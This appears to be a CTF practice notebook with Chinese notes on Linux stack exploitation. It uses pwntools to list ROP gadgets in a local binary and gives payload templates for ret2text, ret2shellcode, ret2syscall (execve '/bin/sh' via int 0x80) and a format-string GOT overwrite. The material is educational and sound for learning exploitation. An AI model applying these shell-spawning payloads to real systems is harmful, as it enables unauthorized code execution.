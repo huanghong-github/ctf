{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3ead36c4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/home/kali/ctfs/pwn'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x400000)\n",
      "[*] Loaded 14 cached gadgets for Path('/home/kali/ctfs/pwn')\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">gadgets: \n",
       "<span style=\"font-weight: bold\">{</span>\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4195646</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40053e</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'add esp, 8'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0xc</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4195645</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40053d</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'add rsp, 8'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0xc</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196203</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40076b</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'leave'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'ebp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'esp'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x2540be403</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196396</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40082c</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop r12'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'r12'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, \n",
       "<span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x14</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196398</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40082e</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x10</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196400</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400830</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0xc</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196402</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400832</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x8</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196395</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40082b</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rbp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r12'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rbp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r12'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r13'</span>,\n",
       "<span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x18</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196399</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40082f</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rbp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rbp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x10</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4195872</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400620</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rbp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rbp'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x8</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196403</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400833</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rdi'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rdi'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x8</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196401</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400831</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rsi'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rsi'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0xc</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4196397</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x40082d</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rsp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'pop r15'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rsp'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r13'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r14'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'r15'</span><span style=\"font-weight: bold\">]</span>, \n",
       "<span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x14</span><span style=\"font-weight: bold\">)</span>,\n",
       "    <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">4194950</span>: <span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400286</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x4</span><span style=\"font-weight: bold\">)</span>\n",
       "<span style=\"font-weight: bold\">}</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "gadgets: \n",
       "\u001b[1m{\u001b[0m\n",
       "    \u001b[1;36m4195646\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40053e\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'add esp, 8'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0xc\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4195645\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40053d\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'add rsp, 8'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0xc\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196203\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40076b\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'leave'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'ebp'\u001b[0m, \u001b[32m'esp'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x2540be403\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196396\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40082c\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop r12'\u001b[0m, \u001b[32m'pop r13'\u001b[0m, \u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'r12'\u001b[0m, \u001b[32m'r13'\u001b[0m, \u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \n",
       "\u001b[1;36m0x14\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196398\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40082e\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop r13'\u001b[0m, \u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'r13'\u001b[0m, \u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x10\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196400\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400830\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0xc\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196402\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400832\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x8\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196395\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40082b\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rbp'\u001b[0m, \u001b[32m'pop r12'\u001b[0m, \u001b[32m'pop r13'\u001b[0m, \u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rbp'\u001b[0m, \u001b[32m'r12'\u001b[0m, \u001b[32m'r13'\u001b[0m,\n",
       "\u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x18\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196399\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40082f\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rbp'\u001b[0m, \u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rbp'\u001b[0m, \u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x10\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4195872\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400620\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rbp'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rbp'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x8\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196403\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400833\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rdi'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rdi'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x8\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196401\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400831\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rsi'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rsi'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0xc\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4196397\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x40082d\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rsp'\u001b[0m, \u001b[32m'pop r13'\u001b[0m, \u001b[32m'pop r14'\u001b[0m, \u001b[32m'pop r15'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rsp'\u001b[0m, \u001b[32m'r13'\u001b[0m, \u001b[32m'r14'\u001b[0m, \u001b[32m'r15'\u001b[0m\u001b[1m]\u001b[0m, \n",
       "\u001b[1;36m0x14\u001b[0m\u001b[1m)\u001b[0m,\n",
       "    \u001b[1;36m4194950\u001b[0m: \u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400286\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x4\u001b[0m\u001b[1m)\u001b[0m\n",
       "\u001b[1m}\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from pwn import *\n",
    "from rich import print\n",
    "import path\n",
    "file_path=path.Path('/home/kali/ctfs/pwn')\n",
    "file_path.chmod(0o777)\n",
    "\n",
    "elf=ELF(file_path)\n",
    "rop=ROP(elf)\n",
    "print(\"gadgets: \",rop.gadgets)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a633801c",
   "metadata": {},
   "source": [
    "## ret2text\n",
    "### 64位传参\n",
    "> 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。\n",
    "当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。\n",
    "参数个数大于 7 个的时候\n",
    "H(a, b, c, d, e, f, g, h);\n",
    "a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9\n",
    "h->8(%esp)\n",
    "g->(%esp)\n",
    "call H\n",
    "\n",
    "### payload\n",
    "```\n",
    "payload = 'a' * 136 + 'b' *4 + p32(system_plt).decode('unicode_escape') +p32(main_addr).decode('unicode_escape') + p32(binsh).decode('unicode_escape')\n",
    "# b填充ebp,system填充返回地址，main填充函数调用的返回地址，binsh填充函数调用的参数\n",
    "\n",
    "payload = b'a'*0x80+b'b'*8 #首先b填充到rbp\n",
    "payload += p64(pop_rdi_ret)+p64(binsh)#设置rdi=bin/sh\n",
    "payload += p64(system_plt)#ret到system_plt地址\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "1354cf21",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"color: #800080; text-decoration-color: #800080\">/bin/</span><span style=\"color: #ff00ff; text-decoration-color: #ff00ff\">sh</span>\n",
       "<span style=\"font-weight: bold\">[]</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[35m/bin/\u001b[0m\u001b[95msh\u001b[0m\n",
       "\u001b[1m[\u001b[0m\u001b[1m]\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"color: #800080; text-decoration-color: #800080; font-weight: bold\">Gadget</span><span style=\"font-weight: bold\">(</span><span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x400833</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'pop rdi'</span>, <span style=\"color: #008000; text-decoration-color: #008000\">'ret'</span><span style=\"font-weight: bold\">]</span>, <span style=\"font-weight: bold\">[</span><span style=\"color: #008000; text-decoration-color: #008000\">'rdi'</span><span style=\"font-weight: bold\">]</span>, <span style=\"color: #008080; text-decoration-color: #008080; font-weight: bold\">0x8</span><span style=\"font-weight: bold\">)</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1;35mGadget\u001b[0m\u001b[1m(\u001b[0m\u001b[1;36m0x400833\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'pop rdi'\u001b[0m, \u001b[32m'ret'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1m[\u001b[0m\u001b[32m'rdi'\u001b[0m\u001b[1m]\u001b[0m, \u001b[1;36m0x8\u001b[0m\u001b[1m)\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "context(os='linux', arch='amd64', log_level='info')\n",
    "if 'system' in elf.plt:\n",
    "    print(\"system plt\",elf.plt['system'])\n",
    "    print(\"system symbols\",elf.symbols['system'])\n",
    "    print(\"system got\",elf.got['system'])\n",
    "print(\"/bin/sh\",list(elf.search(b'/bin/sh')))\n",
    "print(rop.find_gadget(['pop rdi','ret']))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "489f40f1",
   "metadata": {},
   "source": [
    "## ret2shellcode\n",
    "### payload\n",
    "```\n",
    "jmp_esp=elf.search(asm('jmp rsp')).__next__()\n",
    "payload=b'A'*0x88+p64(jmp_esp)+asm(shellcraft.sh()) # jmpesp填充返回地址，跳转到sh\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5eba799a",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"jmp rsp\",list(elf.search(asm('jmp rsp'))))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bcc2ad5e",
   "metadata": {},
   "source": [
    "## retsyscall\n",
    "> 用户进程在执行系统调用前，先把系统调用名（实际上是系统调用号）、输入参数等放到寄存器上(EBX,ECX等寄存器)\n",
    "然后发出int 0x80指令，即触发xxx号中断\n",
    "系统暂停用户进程，根据xxx号中断找到中断服务程序，这个程序名就叫system_call()\n",
    "system_call()接着执行。它会从寄存器中找到系统调用名、输入参数等，并根据系统调用上下文中找到引发系统调用的进程；执行完毕后它又会把输出结果放到寄存器中。\n",
    "系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。\n",
    "\n",
    "### 系统调用\n",
    "```\n",
    "// 字符串：/bin///sh\n",
    "push 0x68\n",
    "push 0x732f2f2f\n",
    "push 0x6e69622f\n",
    "// ebx ecx edx 传参\n",
    "mov ebx,esp\n",
    "xor ecx,ecx\n",
    "xor edx,edx\n",
    "// eax = 系统调用号\n",
    "push 11\n",
    "pop eax\n",
    "// Linux 系统调用\n",
    "int 0x80\n",
    "```\n",
    "```\n",
    "pop_eax = p32(0x080bb196)\n",
    "pop_edx_ecx_ebx = p32(0x0806eb90)\n",
    "bin_sh = p32(0x080be408)\n",
    "int_0x80 = p32(0x08049421)\n",
    "offset = 112\n",
    "payload=flat(['a'*offset, pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, bin_sh,int_0x80])\n",
    "```\n",
    "## ret2libc\n",
    "## ret2dlresolve\n",
    "## ret2csu\n",
    "## print\n",
    "```\n",
    "payload=fmtstr_payload(10,{elf.got['printf']:elf.plt['system']}) #system替换printf\n",
    "p.sendline(b'/bin/sh\\x00')\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "22813c6b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\tlinux-vdso.so.1 (0x00007ffcf752d000)\n",
      "\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f10f6d9c000)\n",
      "\t/lib64/ld-linux-x86-64.so.2 (0x00007f10f6f8a000)\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"color: #800080; text-decoration-color: #800080; font-style: italic\">None</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[3;35mNone\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"color: #800080; text-decoration-color: #800080; font-style: italic\">None</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[3;35mNone\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "!ldd $file_path\n",
    "print(rop.find_gadget(['pop eax','ret']))\n",
    "print(rop.find_gadget(['int 0x80']))\n",
    "for gadget in rop.gadgets.values():\n",
    "    if set(['pop edx','pop ebx','pop ecx','ret']).issubset(set(gadget.insns)):\n",
    "        print(gadget)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "37dc5108",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">s\n",
       "</pre>\n"
      ],
      "text/plain": [
       "s\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "sh = process(file_path)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "vscode": {
   "interpreter": {
    "hash": "dfdc534f9d079ae759dd31998cbdb64fa0f5664494eaf9e34555103a4b77eae0"
   }
  }
 },
